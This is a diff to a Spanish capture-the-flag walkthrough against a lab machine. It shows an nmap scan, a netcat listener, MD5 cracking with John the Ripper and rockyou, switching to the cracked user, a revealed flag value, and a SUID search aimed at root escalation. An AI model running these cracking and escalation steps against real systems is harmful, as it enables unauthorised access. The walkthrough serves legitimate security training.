@@ -10,7 +10,7 @@ Herramientas utilizadas:
 
 Este reto consiste en aplicar técnicas de hacking para encontrar tres banderas en la máquina víctima. Luego de identificar el host procedemos a utilizar la herramienta ```nmap``` para determinar los servicios y versiones que corren por los puertos que tiene abiertos la máquina víctima.
 ```
-nmap <ip_mv> -sCV -Pn -p-
+nmap 10.32.2.48 -sCV -Pn -p-
 ```
 ```
 Host is up (0.084s latency).
@@ -62,3 +62,40 @@ nc -nlvp 4142
 ```
 
 <p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>
+
+Dentro de la máquina víctima procedemos a listar el contenido del directorio **/home/robot**
+
+<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>
+
+Nótese que el archivo de la flag solo puede ser leído por el propietario. Revisamos el fichero **** y encontramos unas credenciales potenciales. 
+
+<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>
+
+La contraseña se encontraba cifrada en MD5 por lo que tubimos que descifrarla utilizando la herramienta ```John The Ripper```
+<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>
+```
+john --format=raw-md5 --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
+  
+  Using default input encoding: UTF-8
+  Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
+  Warning: no OpenMP support for this hash type, consider --fork=2
+  Press 'q' or Ctrl-C to abort, almost any other key for status
+
+  abcdefghijklmnopqrstuvwxyz (robot)
+
+```
+En este punto nos podemos convertir en el usuario robot proporcionando la contraseña encontrada y listamos la segunda flag del reto.
+```
+su robot
+```
+```
+robot@linux:~$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+```
+Segunda flag: flag{822c73956184f694993bede3eb39f959}
+
+Para encontrar la tercera y última flag del reto necesitamos escalar privilegios para convertirnos en root. Buscamos por permisos SUID y encontramos que el binario nmap está corriendo con permisos SUID.
+```
+find / -perm -u=s -type f 2>/dev/null
+```
